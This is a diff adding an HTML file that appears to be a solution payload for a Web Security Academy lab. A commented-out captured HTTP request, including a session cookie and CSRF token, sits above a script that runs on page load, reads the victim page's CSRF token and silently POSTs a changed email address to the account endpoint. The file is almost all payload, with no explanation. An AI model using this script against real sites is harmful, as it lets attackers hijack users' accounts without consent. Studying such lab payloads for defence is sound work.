@@ -1,0 +1,42 @@
+<!--
+POST /my-account/change-email HTTP/2
+Host: 0a5b00e10326509680fe8ff000f20013.web-security-academy.net
+Cookie: session=cSiukJg5IgQceEDdtGYkjvoi4QYR591n
+Content-Length: 59
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Origin: https://0a5b00e10326509680fe8ff000f20013.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a5b00e10326509680fe8ff000f20013.web-security-academy.net/my-account?id=wiener
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+email=asdw%40asdw.com&csrf=H3egS47tAZXb6E1fr8AinuAt5dBnKUe7
+-->
+
+<script>
+    
+    window.addEventListener("DOMContentLoaded",()=>{
+        let token = document.getElementsByName('csrf')[0].value;
+        let data = new FormData();
+    
+        data.append('email',"test@test.com");
+        data.append('csrf',token);
+
+        fetch("/my-account/change-email",{
+            method:"POST",
+            mode:"no-cors",
+            body:data
+        })
+    })
+
+</script>
